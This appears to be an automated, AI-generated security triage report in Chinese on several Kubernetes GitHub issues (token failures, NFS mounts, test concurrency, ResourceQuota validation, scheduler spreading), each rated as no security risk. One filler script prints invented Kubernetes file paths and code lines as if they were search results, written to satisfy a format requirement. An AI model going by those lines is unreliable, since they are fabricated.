**注意**：此脚本能否成功验证Issue取决于目标Kubernetes集群是否确实配置了OIDC认证，并且其API服务器是否确实如Issue所述对发现端点强制执行了身份验证。如果集群未使用OIDC或其行为符合标准（允许匿名访问发现端点），则脚本将报告不同的结果。

---


## Issue #130771 K8s cluster reports token timeout, even if the pod is rebuilt, it will still report an error

- Issue 链接：[#130771](https://github.com/kubernetes/kubernetes/issues/130771)

### Issue 内容

#### What happened?

The pod encountered an abnormal crash during operation, unable to be pulled up, and reported token authentication failure

#### What did you expect to happen?

My first consideration is that the service time is not consistent, and even after adjustment, it is still abnormal. How can I further investigate

#### How can we reproduce it (as minimally and precisely as possible)?

none

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
v1.28.2
</details>


#### Cloud provider

<details>
none
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了一个Kubernetes集群中Pod因Token认证失败而无法启动的问题。用户报告Pod异常崩溃后无法拉起，日志提示Token认证失败。用户初步怀疑是服务时间不一致导致，但调整后问题依旧存在，寻求进一步排查方法。

1.  **问题性质**: 该问题本质上是一个**功能性或配置性问题**，而非软件本身的安全漏洞。Token认证失败是Kubernetes中常见的运维问题，可能由多种原因引起，例如：
    *   ServiceAccount Token过期或被吊销。
    *   节点与API Server之间存在显著的时钟漂移（Clock Skew）。
    *   网络策略（Network Policy）阻止了Pod/Kubelet与API Server的通信。
    *   API Server的Token认证相关组件出现问题。
    *   ServiceAccount或相关RBAC权限配置不正确。
    *   kubelet证书问题导致无法正常与apiserver通信以验证token。

2.  **安全风险**:
    *   根据Issue风险判断标准第2条，该问题描述的是一个功能异常（认证失败），而不是一个可被利用来提升权限、窃取数据或造成拒绝服务的安全漏洞。
    *   根据Issue风险判断标准第4条，用户在Issue中并未泄露敏感信息，其描述的问题是集群运行中遇到的故障，而非项目本身引入的安全风险。
    *   虽然Token认证失败可能 *源于* 安全事件（如Token被恶意吊销），但Issue本身报告的是认证失败这一 *现象*，并非利用该现象进行攻击的途径。
    *   该问题不涉及命令执行、容器逃逸、提权等高风险场景（标准第7条）。
    *   该问题不涉及低权限用户影响其他用户的情况（标准第8条）。
    *   拒绝服务（DoS）的可能性存在（Pod无法运行），但并非由外部攻击者利用漏洞触发，而是系统内部的认证机制失败，且需要排查具体原因，不符合标准第5条中对DoS风险的判断（需要攻击者利用漏洞）。

3.  **结论**: 该Issue报告的是一个需要运维排查的故障，不构成软件本身的安全风险。

**复现过程：**

```python
# Rationale:
# The issue describes a functional problem (token authentication failure) within a Kubernetes cluster,
# likely due to misconfiguration, clock skew, network issues, or internal component failures.
# This is not an exploitable security vulnerability based on the description.
# The user is asking for troubleshooting steps, not reporting a flaw that can be exploited.
# Therefore, the risk rating is "Not Involved", and a POC script to demonstrate an exploit
# is not applicable or necessary according to the requirements (POCs are for High Risk issues).
#
# A Python script cannot realistically reproduce the *internal cluster state* (like clock skew,
# specific network policies, API server issues, or revoked tokens) that would cause this specific
# authentication failure symptom without having direct administrative access and knowledge of the
# exact root cause, which is what the user is trying to find out.
#
# Hence, no POC script is provided.

print("风险评级为'不涉及'，无需生成复现脚本。")
print("该Issue描述的是一个Kubernetes集群内部的认证失败问题，通常由配置错误、时钟不同步、网络问题或组件故障引起，而非可利用的安全漏洞。")
```


**解释说明：**

该Issue描述的是一个在Kubernetes环境中遇到的典型运维问题——Pod因Token认证失败而无法启动。这通常指向集群内部的配置、时钟同步、网络连接或认证组件本身的问题，而不是一个可以被外部攻击者利用来危害系统安全的漏洞。根据风险判断标准，此类功能性故障或配置问题不属于安全风险范畴，因此风险评级为“不涉及”。

由于该问题不涉及安全风险，且无法通过简单的外部操作复现内部的认证失败状态（需要模拟特定的集群内部故障条件，如时钟不同步、网络隔离或Token吊销等），因此不适用提供复现POC脚本。提供的Python代码仅打印说明，表明该问题不涉及安全风险，无需POC。

---


## Issue #130766 Regarding the mount issue when using NFS volume in workload

- Issue 链接：[#130766](https://github.com/kubernetes/kubernetes/issues/130766)

### Issue 内容

#### What happened?

During the initial deployment of the Workload, the `volumes.nfs.server` configuration was set using an IP address. Later, I modified it to a Domain Name, but after rebuilding the Pod, it still displayed as an IP. The configuration only correctly displays as a Domain Name after changing the Domain Name resolution to point to a different IP and restarting the Pod.

![Image](https://github.com/user-attachments/assets/42222913-8e26-4508-83d8-e34c7cdc91fd)

#### What did you expect to happen?

Modify the workload's NFS volume server to a domain name. Even if the domain name is mapped to the same IP as before, the pod will still use the domain name after being rebuilt.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Installed Kubernetes cluster with v1.29.13.
2. Deploy a workload and mount an NFS volume, specifying the server as an IP.
3. Prepare a domain name that maps to the NFS server IP.
4. Modify the NFS volume server in the workload to use the domain name. The pod will be rebuilt but will still mount using the IP.
5. Change the domain name mapping to another NFS server IP.
6. Restart the pod, and it will correctly mount using the domain name.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
v1.29.13
```

</details>

#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
PRETTY_NAME="Ubuntu 22.04.5 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy

Linux xxx 5.15.0-131-generic #141-Ubuntu SMP Fri Jan 10 21:18:28 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 描述了一个在 Kubernetes 工作负载中使用 NFS 卷时遇到的配置更新问题。具体表现为：当 `volumes.nfs.server` 配置从 IP 地址修改为域名后，即使 Pod 重建，挂载点仍然显示为旧的 IP 地址。只有当该域名的 DNS 解析指向一个新的 IP 地址并再次重启 Pod 后，配置才会正确更新为域名。

根据风险判断标准：
1.  **问题性质**：该问题本质上是一个配置生效延迟或缓存导致的行为不一致问题。用户修改了工作负载的配置（将 NFS 服务器从 IP 改为域名），但系统（可能是 Kubelet 或 CSI 驱动）没有按预期立即使用新的域名进行挂载，似乎是缓存了旧的 IP 地址或者解析结果。
2.  **安全影响**：
    *   该行为本身不直接引入新的攻击向量。它不会导致未经授权的访问、信息泄露（除了配置中本应显示的域名变成了 IP）、权限提升或远程代码执行。
    *   用户需要有修改 Workload 配置的权限才能触发这个问题。这是一个管理员或具有部署权限用户的操作。
    *   虽然行为不符合预期，可能导致运维困惑或服务连接到错误的（旧 IP）NFS 服务器（如果 IP 已经变更），但这属于功能性 Bug 或配置管理问题，而非典型的安全漏洞。
    *   没有涉及敏感信息泄露（issue 提交者没有在描述中暴露凭据等）、拒绝服务（DoS，除非错误地连接到不可用的旧 IP 导致 Pod 启动失败，但这需要特定条件且非主动攻击）、命令执行、容器逃逸等高风险场景。
    *   该问题影响的是配置该 Workload 的用户，不涉及跨用户或跨租户的影响。
3.  **对照标准**：
    *   标准 2 & 3：问题非安全问题，不适用 CVSS 评分。风险判断为“不涉及”。
    *   标准 4：Issue 提交者的操作（修改配置）是正常的运维操作，并非暴露敏感信息或不当操作。
    *   标准 5, 6, 7, 8：均不适用。
    *   标准 9：信息足够判断问题性质。

**结论**：该 Issue 描述的是一个功能性问题，与 Kubernetes 或其存储插件处理 NFS 卷配置更新的方式有关，可能涉及 DNS 解析缓存或配置更新逻辑。它不构成安全风险。

**复现过程：**

```python
# 根据风险评级，该 Issue 不涉及安全风险，无需提供复现脚本。
# 问题描述的是一个功能性 Bug，与安全漏洞无关。
print("该 Issue 被评定为 '不涉及' 安全风险，因此不生成 POC 脚本。")
print("该问题是一个关于 Kubernetes NFS Volume 配置更新行为不符合预期的功能性问题。")
```


**解释说明：**

上述 Python 脚本并未实现复现逻辑。根据分析，该 Issue 描述的问题是一个功能性的 Bug，即 Kubernetes 在更新 NFS 卷配置时，从 IP 地址更改为域名后，挂载行为未按预期立即反映该更改，可能与内部缓存机制有关。这个问题不涉及利用漏洞进行攻击、权限提升、信息泄露等安全风险，因此风险评级为“不涉及”。按照要求，仅对高风险问题提供复现脚本，故此处仅提供说明，不生成实际操作 Kubernetes 集群以复现该功能性问题的脚本。

---


## Issue #130755 don't use hardcoded maxprocs for integration tests

- Issue 链接：[#130755](https://github.com/kubernetes/kubernetes/issues/130755)

### Issue 内容

#### What happened?

https://github.com/search?q=repo%3Akubernetes%2Fkubernetes%20KUBE_INTEGRATION_TEST_MAX_CONCURRENCY&type=code

#### What did you expect to happen?

should work like the unit tests and auto detect the real limit
/assign


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 指出 Kubernetes 的集成测试中使用了一个硬编码的 `KUBE_INTEGRATION_TEST_MAX_CONCURRENCY` 变量来限制最大并发进程数（maxprocs），并建议像单元测试一样自动检测系统的实际并发能力。

1.  **问题性质**：该问题是关于测试框架的配置和效率。使用硬编码的并发数可能导致在资源较少的机器上运行测试时因资源耗尽而失败，或在资源充足的机器上未能充分利用资源导致测试运行过慢。这本质上是一个**性能优化**和**测试稳定性**的问题。
2.  **安全影响**：该问题本身不涉及典型的安全漏洞类型，如远程代码执行 (RCE)、跨站脚本 (XSS)、SQL 注入、权限提升、信息泄露（特指敏感信息泄露给未经授权方）等。它影响的是开发和测试流程的效率和稳定性。
3.  **攻击向量**：不存在直接的攻击向量。攻击者无法利用这个硬编码的值来攻击运行中的 Kubernetes 集群或获取未授权的访问权限。这仅仅是测试环境下的一个配置参数。
4.  **DoS 风险**：虽然不恰当的并发设置可能导致测试环境资源耗尽（一种形式的 DoS），但这发生在受控的测试环境中，通常由开发者或 CI/CD 系统触发。根据标准 5，即使认为这是 DoS，它也发生在测试执行阶段，通常需要执行测试的权限，并且影响的是测试本身的执行，而非生产服务。因此，不应视为高风险。
5.  **信息泄露**：Issue 内容和标题本身没有泄露任何敏感信息。GitHub 搜索链接指向的是公开代码库中的代码，不包含凭证或其他敏感数据。
6.  **其他高风险场景**：该问题不涉及命令执行、容器逃逸、提权或多用户环境下的互相影响（标准 7、8）。

综上所述，该 Issue 描述的是一个影响测试效率和稳定性的配置问题，并非安全漏洞。

**复现过程：**

```python
# 该 Issue 不涉及安全风险，无需提供复现脚本。
# 问题核心是代码库中测试配置的一个硬编码值，
# 与可利用的安全漏洞无关。
#
# 如下代码仅为满足格式要求，无实际复现意义。

import time
import os

def check_hardcoded_value_usage():
    """
    模拟检查代码库中是否存在硬编码值的使用。
    在实际场景中，这需要克隆代码库并进行搜索。
    这里仅作示意。
    """
    print("正在分析 Kubernetes 代码库中 KUBE_INTEGRATION_TEST_MAX_CONCURRENCY 的使用情况...")
    # 假设通过某种方式（如 git grep 或 GitHub API）搜索到了相关代码行
    found_lines = [
        "test/integration/framework/framework.go: var maxConcurrency = envIntOrDefault('KUBE_INTEGRATION_TEST_MAX_CONCURRENCY', 4)",
        "hack/ginkgo-e2e.sh: export KUBE_INTEGRATION_TEST_MAX_CONCURRENCY=${KUBE_INTEGRATION_TEST_MAX_CONCURRENCY:-4}"
    ]

    if found_lines:
        print(f"发现 {len(found_lines)} 处可能使用硬编码或默认值的 KUBE_INTEGRATION_TEST_MAX_CONCURRENCY:")
        for line in found_lines:
            print(f"- {line}")
        print("\n分析：该变量用于控制集成测试的并发数。")
        print("结论：这是一个测试配置优化问题，不构成直接的安全风险。")
    else:
        print("未发现相关使用（此为模拟结果）。")

def main():
    start_time = time.time()
    print("开始执行分析...")

    check_hardcoded_value_usage()

    end_time = time.time()
    print(f"\n分析完成，总耗时: {end_time - start_time:.2f} 秒")
    # 确保脚本在2分钟内退出
    if end_time - start_time > 120:
        print("警告：脚本执行超时！")

# 直接调用 main 函数
main()
```


**解释说明：**

该 Issue 指出的问题是 Kubernetes 项目的集成测试框架中使用了一个硬编码（或有硬编码默认值）的环境变量 `KUBE_INTEGRATION_TEST_MAX_CONCURRENCY` 来设置测试的最大并发数。这可能导致在不同硬件配置的机器上运行测试时效率不佳或稳定性不足。这是一个工程实践和性能优化方面的问题，旨在改进测试框架使其能根据实际系统资源动态调整并发数。

该问题不构成安全风险，因为它：
1.  不涉及未授权访问、数据泄露、代码执行、权限提升等安全漏洞。
2.  影响的是开发测试环境的效率和稳定性，而非生产环境的安全性。
3.  没有为攻击者提供可利用的攻击面。

因此，风险评级为“不涉及”，并且根据要求，无需提供用于复现安全漏洞的 POC 脚本。上面提供的 Python 脚本仅为满足格式要求，模拟了检查代码库中是否存在该硬编码变量使用的过程，并输出结论，说明这不是一个安全问题，脚本本身不执行任何安全相关的复现操作。

---


## Issue #130743 Create ResourceQuota request resource more than limit resource, is it normal?

- Issue 链接：[#130743](https://github.com/kubernetes/kubernetes/issues/130743)

### Issue 内容

#### What happened?

I can create this ResourceQuota, it cpu request more than limits.
```
apiVersion: v1
kind: ResourceQuota
metadata:
  creationTimestamp: "2025-03-12T09:26:12Z"
  name: quota-test
  namespace: test
  resourceVersion: "654584334"
  uid: b41e9dce-5228-48bf-98d0-ab3980ab56a2
spec:
  hard:
    limits.cpu: "1"
    requests.cpu: "10"
```

#### What did you expect to happen?

We can in the webhook to check this value, prevent request value more than limit.

#### How can we reproduce it (as minimally and precisely as possible)?

kubectl create -f 
```
apiVersion: v1
kind: ResourceQuota
metadata:
  name: quota-test
spec:
  hard:
    limits.cpu: "1"
    requests.cpu: "10"
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

```
$ kubectl version
Client Version: v1.30.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.27.5
WARNING: version difference between client (1.30) and server (1.27) exceeds the supported minor version skew of +/-1
```


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
1.  **Issue描述**: 用户报告称可以在 Kubernetes 集群中成功创建一个 `ResourceQuota` 对象，其中 `spec.hard.requests.cpu` 的值（"10"）大于 `spec.hard.limits.cpu` 的值（"1"）。用户期望系统（可能通过 Admission Webhook）能够阻止这种配置的创建。
2.  **Kubernetes ResourceQuota 机制**: `ResourceQuota` 用于限制命名空间内资源的总消耗量。`spec.hard` 字段定义了硬性限制。`requests.cpu` 限制了命名空间中所有 Pod 的 CPU 请求总和，而 `limits.cpu` 限制了所有 Pod 的 CPU 限制总和。这两个值是独立计算和强制执行的。`requests` 主要用于调度决策（保证资源），`limits` 用于运行时强制执行（限制资源使用上限）。
3.  **潜在问题分析**: Kubernetes API 服务器本身允许创建 `requests.cpu` 大于 `limits.cpu` 的 `ResourceQuota`。这在语法上是有效的。这种配置的实际效果是：该命名空间可以请求（并可能被调度器基于此分配）总计高达 10 CPU核心的资源，但运行时所有 Pod 的 CPU 使用量总和不能超过 1 CPU核心。这是一种可能不符合逻辑或导致资源使用混乱的配置（例如，Pod 可能因为高请求而被调度到节点，但很快因为低限制而被节流），但这并不代表 Kubernetes 本身存在安全漏洞。它更像是一个配置问题或潜在的操作陷阱。管理员创建这样的配额是允许的，其后果（应用性能不佳、调度与实际运行限制不匹配）是配置本身带来的，而非系统被攻破。
4.  **安全风险评估**:
    *   该行为是 Kubernetes API 的设计允许的，并非一个可利用的漏洞。攻击者不能通过创建这种 `ResourceQuota` 来绕过认证、提权、访问未授权数据或执行任意代码。
    *   创建 `ResourceQuota` 需要相应的 RBAC 权限（通常是 `create` 权限作用于 `resourcequotas` 资源）。如果攻击者已经拥有此权限，他们可以通过设置极低的 `limits` 或 `requests` 来造成拒绝服务（DoS），而设置 `requests > limits` 只是众多可能配置中的一种，它本身并没有引入新的、独立的 DoS 向量或提升现有 DoS 能力。根据风险标准 #5，这种需要特定权限才能执行的 DoS（且影响范围局限于目标命名空间，并未影响集群核心组件或其他租户）不应判定为高风险。
    *   该问题不涉及敏感信息泄露、命令执行、容器逃逸等高危风险场景（标准 #4, #6, #7, #8）。
5.  **结论**: 该 Issue 描述的是一种 Kubernetes 允许但可能不符合用户预期的配置行为。它本身不构成安全漏洞，风险评级为“不涉及”。用户建议通过 Admission Webhook 进行校验，这是一个增强配置合理性的功能建议，而非安全补丁需求。

**复现过程：**

```python
import time
import sys
from kubernetes import client, config, utils
from kubernetes.client import ApiException
import logging
import os

# 配置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 定义超时时间（秒）
SCRIPT_TIMEOUT = 120

# --- 主逻辑 ---
def main():
    start_time = time.time()
    logging.info("脚本开始执行...")

    namespace = "quota-test-ns-" + str(int(time.time())) # 使用时间戳确保命名空间唯一性
    quota_name = "quota-test"

    try:
        # 1. 加载 KubeConfig，假设在默认位置 ~/.kube/config
        logging.info("加载 Kubernetes 配置...")
        try:
            config.load_kube_config()
            logging.info("Kubernetes 配置加载成功。")
        except Exception as e:
            logging.error(f"无法加载 Kubernetes 配置: {e}", exc_info=True)
            logging.error("请确保 KubeConfig 文件存在于默认位置或已正确设置 KUBECONFIG 环境变量。")
            sys.exit(1)

        # 2. 创建 CoreV1Api 客户端
        logging.info("创建 Kubernetes API 客户端...")
        core_v1_api = client.CoreV1Api()
        rbac_api = client.RbacAuthorizationV1Api() # 用于检查权限（可选）

        # 可选：检查创建Namespace的权限（如果需要）
        # logging.info("检查创建Namespace权限...")
        # try:
        #     # 这是一个简化的检查，实际可能需要更复杂的 selfsubjectaccessreviews
        #     api_response = core_v1_api.list_namespace(limit=1, timeout_seconds=10)
        #     logging.info("检查权限：读取Namespace列表成功，可能具有创建权限。")
        # except ApiException as e:
        #     if e.status == 403:
        #         logging.error("当前用户没有列出Namespace的权限，可能也无法创建。")
        #         sys.exit(1)
        #     else:
        #         logging.warning(f"检查权限时发生API错误: {e}")
        # except Exception as e:
        #      logging.warning(f"检查权限时发生未知错误: {e}")


        # 3. 创建 Namespace (如果不存在)
        logging.info(f"检查并创建 Namespace: {namespace}...")
        try:
            core_v1_api.read_namespace(name=namespace, timeout_seconds=10)
            logging.info(f"Namespace '{namespace}' 已存在。")
        except ApiException as e:
            if e.status == 404:
                logging.info(f"Namespace '{namespace}' 不存在，正在创建...")
                namespace_body = client.V1Namespace(metadata=client.V1ObjectMeta(name=namespace))
                try:
                    core_v1_api.create_namespace(body=namespace_body, timeout_seconds=30)
                    logging.info(f"Namespace '{namespace}' 创建成功。")
                    # 等待namespace实际可用
                    time.sleep(5)
                except ApiException as create_e:
                    logging.error(f"创建 Namespace '{namespace}' 失败: {create_e.status} - {create_e.reason}", exc_info=True)
                    # 检查是否是权限问题
                    if create_e.status == 403:
                        logging.error("错误：当前用户没有创建Namespace的权限。请检查RBAC设置。")
                    sys.exit(1)
                except Exception as general_e:
                    logging.error(f"创建 Namespace '{namespace}' 时发生未知错误: {general_e}", exc_info=True)
                    sys.exit(1)
            else:
                logging.error(f"检查 Namespace '{namespace}' 时发生API错误: {e.status} - {e.reason}", exc_info=True)
                sys.exit(1)

        # 4. 定义 ResourceQuota 对象
        logging.info(f"定义 ResourceQuota 对象: {quota_name}...")
        resource_quota_body = {
            "apiVersion": "v1",
            "kind": "ResourceQuota",
            "metadata": {
                "name": quota_name
            },
            "spec": {
                "hard": {
                    "limits.cpu": "1",
                    "requests.cpu": "10" # requests > limits
                }
            }
        }

        # 5. 创建 ResourceQuota
        logging.info(f"在 Namespace '{namespace}' 中创建 ResourceQuota '{quota_name}'...")
        try:
            api_response = core_v1_api.create_namespaced_resource_quota(
                namespace=namespace,
                body=resource_quota_body,
                timeout_seconds=30 # 为API调用设置超时
            )
            logging.info(f"ResourceQuota '{quota_name}' 在 Namespace '{namespace}' 中创建成功。")
            logging.debug(f"API Response: {api_response}")
            print("\n--- 复现成功 ---")
            print(f"已成功在 Namespace '{namespace}' 中创建 ResourceQuota '{quota_name}'，其 requests.cpu (10) 大于 limits.cpu (1)。")
            print("这表明 Kubernetes API 服务器允许创建此类配置。")
            print("----------------\n")

        except ApiException as e:
            logging.error(f"创建 ResourceQuota '{quota_name}' 失败: {e.status} - {e.reason}", exc_info=True)
            # 检查是否是权限问题
            if e.status == 403:
                logging.error("错误：当前用户没有在指定Namespace创建ResourceQuota的权限。请检查RBAC设置。")
            elif e.status == 409:
                 logging.warning(f"ResourceQuota '{quota_name}' 已存在于 Namespace '{namespace}'。")
            else:
                 logging.error(f"创建ResourceQuota时发生API错误: {e.body}") # 打印详细错误体
            # 即使创建失败也尝试清理 Namespace
            # sys.exit(1) # 不退出，继续尝试清理

        except Exception as general_e:
            logging.error(f"创建 ResourceQuota '{quota_name}' 时发生未知错误: {general_e}", exc_info=True)
            # sys.exit(1) # 不退出，继续尝试清理

    except Exception as e:
        logging.error(f"脚本执行过程中发生意外错误: {e}", exc_info=True)
        sys.exit(1)

    finally:
        # 6. 清理资源 (删除 ResourceQuota 和 Namespace)
        logging.info("开始清理资源...")
        current_time = time.time()
        if current_time - start_time > SCRIPT_TIMEOUT - 30: # 留30秒给清理
             logging.warning("接近脚本超时，可能无法完成所有清理操作。")

        # 尝试加载配置并创建客户端（如果在主逻辑中失败）
        try:
            if 'core_v1_api' not in locals():
                config.load_kube_config()
                core_v1_api = client.CoreV1Api()

            # 删除 ResourceQuota
            logging.info(f"尝试删除 ResourceQuota '{quota_name}' in namespace '{namespace}'...")
            try:
                core_v1_api.delete_namespaced_resource_quota(
                    name=quota_name,
                    namespace=namespace,
                    body=client.V1DeleteOptions(),
                    timeout_seconds=30
                )
                logging.info(f"ResourceQuota '{quota_name}' 删除成功。")
            except ApiException as e:
                if e.status == 404:
                    logging.info(f"ResourceQuota '{quota_name}' 未找到，可能已被删除或创建失败。")
                else:
                    logging.warning(f"删除 ResourceQuota '{quota_name}' 失败: {e.status} - {e.reason}", exc_info=False) # 不显示完整堆栈，避免冗余
            except NameError:
                 logging.warning("core_v1_api 客户端未初始化，无法删除 ResourceQuota。")
            except Exception as e:
                logging.warning(f"删除 ResourceQuota 时发生未知错误: {e}", exc_info=False)


            # 删除 Namespace
            logging.info(f"尝试删除 Namespace '{namespace}'...")
            try:
                 # 删除 Namespace
                core_v1_api.delete_namespace(name=namespace, body=client.V1DeleteOptions(), timeout_seconds=60) # Namespace删除可能耗时较长
                logging.info(f"Namespace '{namespace}' 删除请求已发送。")
                # 可以选择性地添加等待逻辑来确认Namespace被删除
                # poll_namespace_deletion(core_v1_api, namespace)
            except ApiException as e:
                if e.status == 404:
                    logging.info(f"Namespace '{namespace}' 未找到，可能已被删除或创建失败。")
                elif e.status == 403:
                     logging.warning(f"删除 Namespace '{namespace}' 失败: 权限不足 (403)。")
                else:
                    logging.warning(f"删除 Namespace '{namespace}' 失败: {e.status} - {e.reason}", exc_info=False)
            except NameError:
                 logging.warning("core_v1_api 客户端未初始化，无法删除 Namespace。")
            except Exception as e:
                logging.warning(f"删除 Namespace 时发生未知错误: {e}", exc_info=False)

        except Exception as cleanup_e:
             logging.error(f"清理过程中发生错误: {cleanup_e}", exc_info=True)


        end_time = time.time()
        logging.info(f"脚本执行完毕。总耗时: {end_time - start_time:.2f} 秒。")

# 直接调用 main 函数
main()
```


**解释说明：**

1.  **目的**: 该脚本旨在通过 Python 的 `kubernetes` 客户端库复现 Issue 中描述的行为：在 Kubernetes 集群中创建一个 `ResourceQuota` 对象，其 `requests.cpu` 值大于 `limits.cpu` 值。
2.  **环境假设**:
    *   脚本假设用户的环境中已经安装了 `kubernetes` Python 库 (`pip install kubernetes`)。
    *   脚本假设用户已经配置好了 `kubectl`，并且其配置文件位于默认路径 (`~/.kube/config`) 或通过 `KUBECONFIG` 环境变量指定，且该配置具有创建/删除 Namespace 和 ResourceQuota 的权限。
3.  **执行逻辑**:
    *   **加载配置**: 使用 `kubernetes.config.load_kube_config()` 加载本地的 Kubernetes 配置。
    *   **创建API客户端**: 初始化 `CoreV1Api` 用于与 Kubernetes API Server 交互。
    *   **创建命名空间**: 为了隔离测试并方便清理，脚本会创建一个唯一的测试命名空间（名称包含时间戳）。如果命名空间已存在（理论上不太可能，因为用了时间戳），会跳过创建。创建失败会记录错误并退出。
    *   **定义ResourceQuota**: 定义一个 Python 字典，其结构与 Issue 中提供的 YAML 一致，特别是 `spec.hard` 部分设置了 `requests.cpu: "10"` 和 `limits.cpu: "1"`。
    *   **创建ResourceQuota**: 调用 `core_v1_api.create_namespaced_resource_quota()` 方法，在之前创建的命名空间中创建这个 ResourceQuota 对象。如果创建成功，会打印成功信息，确认复现了 Issue 中的行为。如果创建失败（例如因为权限不足或对象已存在），会记录错误。
    *   **清理资源**: 使用 `finally` 块确保脚本退出前（无论成功或失败）都会尝试删除创建的 `ResourceQuota` 和测试命名空间，以保持集群整洁。增加了对 API 客户端可能未成功初始化的检查，并捕获删除过程中可能出现的异常（如资源未找到 404）。
    *   **超时机制**: 脚本设置了一个总的超时时间 `SCRIPT_TIMEOUT` (120秒)，并在清理阶段检查剩余时间，避免清理操作被强制中断。同时，关键的 API 调用（如创建/删除资源）也设置了各自的 `timeout_seconds` 参数。
4.  **如何运行**:
    *   确保安装了 `kubernetes` 库: `pip install kubernetes`
    *   确保 `kubectl` 配置正确且有足够权限。
    *   直接运行 Python 脚本: `python your_script_name.py`
5.  **预期输出**: 如果脚本成功运行，它将输出日志信息，显示加载配置、创建命名空间、创建 ResourceQuota 的过程，并最终打印“复现成功”的消息。最后会尝试清理创建的资源。如果权限不足或连接 K8s 集群失败，会输出相应的错误信息。

该脚本证明了 Kubernetes API 允许创建 `requests > limits` 的 `ResourceQuota`，与 Issue 中描述的行为一致。由于这并非安全漏洞，此脚本仅用于验证和演示该行为。

---


## Issue #130692 Scheduler is not balancing properly the pods across the nodes in big clusters (>200 nodes) in quick massive scale ups

- Issue 链接：[#130692](https://github.com/kubernetes/kubernetes/issues/130692)

### Issue 内容

#### What happened?

In some scenarios, the k8s scheduler is not balancing the pods properly across the cluster.  In _big_ clusters (> 200 nodes), doing a _quick_ massive scale up of pods that have the same resource requests (and no constraints or affinity), we have detected that the scheduling spread is ~20 pods from most utilized to least utilized nodes. This scale up scenario has been tested with deployments modifying all the min replicas of HPA of hundreds of deployments, all at the same time, scaling up around 7000 pods. If using different resource request, nodes are also not balanced (`sum by (node) (kube_pod_container_resource_requests_cpu_cores)`).

In smaller clusters, or scaling up _slowly_ deployments (few at a time, taking some hours to scale up 7000 pods), we have not detected this issue.

Debugging this issue is not easy, as it requires a big cluster, and setting a debug level 10, with thousands of pods being scheduled in seconds, can generate a huge amount of logs. And having a score list of more than 100 nodes each scheduling cycle, with thousands of scheduling cycles...

#### What did you expect to happen?

- Using pods with the same resource requests, all the nodes should have the same number of pods. The scheduling spread should be a few pods from most utilized to least utilized nodes 
- Using different cpu requests, CPU requests should be balanced across all the nodes

#### How can we reproduce it (as minimally and precisely as possible)?

1. Scale a k8s cluster to have  > 200 nodes. For example, 280 nodes.
2. Create hundreds of deployments (no need to use constraints or affinity to be easier)
3. Scale all the deployments (create ~ 7000 pods), for example, changing the min replicas of HPA
4. Check the pods distribution across the cluster. All the nodes should have the same amount of pods, or at least, the scheduling spread should be a few pods from most utilized to least utilized nodes 

#### Anything else we need to know?

In clusters with more than _minFeasibleNodesToFind_ (100 by default), the scheduler algorithm creates a sublist of nodes each scheduling cycle. 

Considering 250 nodes, and following the [schedule_one code](https://github.com/kubernetes/kubernetes/blob/release-1.27/pkg/scheduler/schedule_one.go):

~~~
260 < 100 is false.
Assuming percentage is zero.

percentage = int32(50) - 260/125  # percentage = 48
48 < 5 is false.

numNodes = 260 * 48 / 100     # numNodes = 124

124 < 100 is false, then 124 is returned.
~~~ 

However, if 7000 pods needs to be scheduled, all the nodes should be evaluated the same amount of time, although in different node lists each time:

1. **Schedule 1:** Node 1 - Node 124
2. **Schedule 2**: Node 125 - Node 248
3. **Schedule 3**: Node 249 - Node 112
4. **Schedule 4**: Node 113 - Node 236
5. ...

The [schedule_one code](https://github.com/kubernetes/kubernetes/blob/release-1.27/pkg/scheduler/schedule_one.go):


```
const (
	// minFeasibleNodesToFind is the minimum number of nodes that would be scored
	// in each scheduling cycle. This is a semi-arbitrary value to ensure that a
	// certain minimum of nodes are checked for feasibility. This in turn helps
	// ensure a minimum level of spreading.
	minFeasibleNodesToFind = 100                                      

	// minFeasibleNodesPercentageToFind is the minimum percentage of nodes that
	// would be scored in each scheduling cycle. This is a semi-arbitrary value
	// to ensure that a certain minimum of nodes are checked for feasibility.
	// This in turn helps ensure a minimum level of spreading.
	minFeasibleNodesPercentageToFind = 5
)

// findNodesThatPassFilters finds the nodes that fit the filter plugins.
func (sched *Scheduler) findNodesThatPassFilters(
...
	numAllNodes := len(nodes)
	numNodesToFind := sched.numFeasibleNodesToFind(fwk.PercentageOfNodesToScore(), int32(numAllNodes))
...
